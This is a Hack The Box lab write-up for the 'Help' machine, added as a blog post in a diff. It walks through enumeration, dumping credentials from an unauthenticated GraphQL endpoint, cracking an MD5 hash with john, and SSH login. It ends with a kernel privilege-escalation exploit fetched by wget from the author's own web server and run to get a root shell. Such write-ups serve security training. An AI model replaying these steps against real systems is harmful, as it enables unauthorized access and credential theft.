@@ -1,0 +1,243 @@
+---
+title: Help Writeup - Hack The Box
+description: Exploiting GraphQL endpoint and HelpDeskZ vulnerabilities for initial access, then using a kernel exploit for privilege escalation
+author: Nontas Bakoulas
+date: 2025-10-12
+category: HTB Machines
+reading_time: 15
+---
+
+## Enumeration
+Let's start with an `nmap` scan:
+```console title="Nmap scan"
+nontas@local$ nmap -sVC 10.129.230.159
+Starting Nmap 7.93 ( https://nmap.org ) at 2025-10-12 16:02 EEST
+Nmap scan report for 10.129.230.159
+Host is up (0.056s latency).
+Not shown: 997 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 e5bb4d9cdeaf6bbfba8c227ad8d74328 (RSA)
+|   256 d5b010507486a39fc5536f3b4a246119 (ECDSA)
+|_  256 e21b88d37621d41e38154a8111b79907 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18
+|_http-title: Did not follow redirect to http://help.htb/
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesn't have a title (application/json; charset=utf-8).
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 30.62 seconds
+```
+
+Port `80` tried to redirect us to `help.htb`, so add it to `/etc/hosts`.
+
+It shows the default `Apache2` page: ![Apache default page](/images/blog/help/IMG-20251012170131783.png)
+
+Let's search for other paths:
+```console title="Directory enumeration"
+nontas@local$ ffuf -w /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://help.htb/FUZZ -ic
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://help.htb/FUZZ
+ :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+                        [Status: 200, Size: 11321, Words: 3503, Lines: 376, Duration: 65ms]
+javascript              [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 57ms]
+support                 [Status: 301, Size: 306, Words: 20, Lines: 10, Duration: 9013ms]
+```
+
+The `/support` page shows `HelpDeskZ` running: ![HelpDeskZ interface](/images/blog/help/IMG-20251012170430632.png)
+
+### GraphQL Endpoint
+Let's also visit port `3000` where the `Node.js Express` app is running: ![Node.js response](/images/blog/help/IMG-20251012172619525.png)
+
+Since `ffuf` doesn't give any results, we guess that it's probably refering to `/graphql`, which fortunately gives us a response: ![GraphQL endpoint](/images/blog/help/IMG-20251012172953558.png)
+
+Running [graphqw00f](https://github.com/dolevf/graphw00f) shows `Diana.jl` as the engine used:
+```console title="GraphQL fingerprinting"
+nontas@local$ git clone https://github.com/dolevf/graphw00f.git
+<SNIP>
+nontas@local$ cd graphw00f
+nontas@local$ python3 main.py -d -f -t http://10.129.230.159:3000
+
+                +-------------------+
+                |     graphw00f     |
+                +-------------------+
+                  ***            ***
+                **                  **
+              **                      **
+    +--------------+              +--------------+
+    |    Node X    |              |    Node Y    |
+    +--------------+              +--------------+
+                  ***            ***
+                     **        **
+                       **    **
+                    +------------+
+                    |   Node Z   |
+                    +------------+
+
+                graphw00f - v1.2.1
+          The fingerprinting tool for GraphQL
+           Dolev Farhi <dolev@lethalbit.com>
+
+[*] Checking http://10.129.230.159:3000
+[*] Checking http://10.129.230.159:3000/
+[*] Checking http://10.129.230.159:3000/api
+[*] Checking http://10.129.230.159:3000/graphql
+[!] Found GraphQL at http://10.129.230.159:3000/graphql
+[*] Attempting to fingerprint...
+[*] Discovered GraphQL Engine: (Diana.jl - GraphQL for Julia)
+[!] Attack Surface Matrix: https://github.com/nicholasaleks/graphql-threat-matrix/blob/master/implementations/diana.md
+[!] Technologies: Julia
+[!] Homepage: https://github.com/neomatrixcode/Diana.jl
+[*] Completed.
+```
+
+Let's make a request to `/graphql?query=...` to see what shows up: ![GraphQL query test](/images/blog/help/IMG-20251012180801537.png)
+
+Let's use `query={user}` in case that exists: ![User query](/images/blog/help/IMG-20251012182003134.png)
+
+Now let's test if the subfield `username` exists via `query={user {username} }` (URL Encoded): ![Username field](/images/blog/help/IMG-20251012182248395.png)
+
+We were successful, let's try adding the `password` field as well via `query={user {username, password} }`: ![Credentials found](/images/blog/help/IMG-20251012182347407.png)
+
+<Callout title="Alternative Method" type="info">
+If you want to use `curl`:
+```bash
+curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username, password} }' | jq
+```
+</Callout>
+
+We got a valid set of credentials:
+```txt
+username: helpme@helpme.com
+password: 5d3c93182bb20f07b994a7f617e99cff
+```
+
+<Callout title="GraphQL Extension" type="info">
+We can also use the extension `GraphQL Analyzer` in Caido, which will run introspection queries for us: ![GraphQL Analyzer](/images/blog/help/IMG-20251012182722081.png)
+</Callout>
+
+The password is an MD5 hash, so first save it in the file `hash.txt` and then use `john` to crack it:
+```console title="Password cracking"
+nontas@local$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=raw-md5
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 128/128 ASIMD 4x2])
+Warning: no OpenMP support for this hash type, consider --fork=4
+Note: Passwords longer than 18 [worst case UTF-8] to 55 [ASCII] rejected
+Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
+godhelpmeplz     (?)
+1g 0:00:00:00 DONE (2025-10-12 18:33) 1.316g/s 10312Kp/s 10312Kc/s 10312KC/s godlove20..godfirst757
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed.
+```
+
+The password is `godhelpmeplz`.
+
+## Initial Foothold
+There are 2 methods to get access into the system, we can check it via `searchsploit`:
+```console title="Exploit search"
+nontas@local$ searchsploit helpdeskz
+----------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                     |  Path
+----------------------------------------------------------------------------------- ---------------------------------
+HelpDeskZ 1.0.2 - Arbitrary File Upload                                            | php/webapps/40300.py
+HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download     | php/webapps/41200.py
+Helpdeskz v2.0.2 - Stored XSS                                                      | php/webapps/52068.txt
+----------------------------------------------------------------------------------- ---------------------------------
+```
+
+We can find the version by going to `/support/README.md`: ![Version information](/images/blog/help/IMG-20251012204601979.png)
+
+The version is `1.0.2`, so we can use either exploit. 
+
+Since we already have the credentials the exploit `(Authenticated) SQL Injection` is usuable.
+
+Unfortunately, both exploits need a lot of hassle to work since they're written with older versions of python and you also need to synchronize the local time with the server time.
+
+<Callout title="Searchsploit Commands" type="info">
+Some useful commands for `searchsploit`:
+```bash
+searchsploit -m 41200 # Copy script to current directory
+searchsploit -x 41200 # View source code
+```
+</Callout>
+
+The final set of credentials found are: `support@mysite.com:Welcome1`.
+
+We can `ssh` into the server by guessing the name `help`:
+```console title="SSH login"
+nontas@local$ ssh help@help.htb
+<SNIP>
+help@help.htb's password:
+<SNIP>
+help@help:~$
+```
+
+And we get the user flag.
+
+## Privilege Escalation
+The Kernel version is the following:
+```console
+help@help:~$ uname -a
+Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+```
+
+We look for an exploit:
+```console title="Kernel exploit search"
+nontas@local$ searchsploit 4.4.0-116
+--------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                   |  Path
+--------------------------------------------------------------------------------- ---------------------------------
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation           | linux/local/44298.c
+--------------------------------------------------------------------------------- ---------------------------------
+```
+
+Seems like there's a PrivEsc exploit. Download it locally and compile it:
+```console title="Exploit compilation"
+nontas@local$ searchsploit -m 44298
+nontas@local$ gcc 44298.c -o exploit
+```
+
+Start a simple Python web server:
+```console
+nontas@local$ python3 -m http.server 8082
+```
+
+And download the exploit on the remote:
+```console title="Privilege escalation"
+help@help:~$ wget http://10.10.14.78:8082/exploit
+help@help:~$ chmod +x exploit
+help@help:~$ ./exploit
+task_struct = ffff88001cb67000
+uidptr = ffff8800001563c4
+spawning root shell
+root@help:~#
+```
+
+And we get the root flag:
+```console
+root@help:~# cd /root
+root@help:/root# cat root.txt
+```
+
+We have completed **Help**!
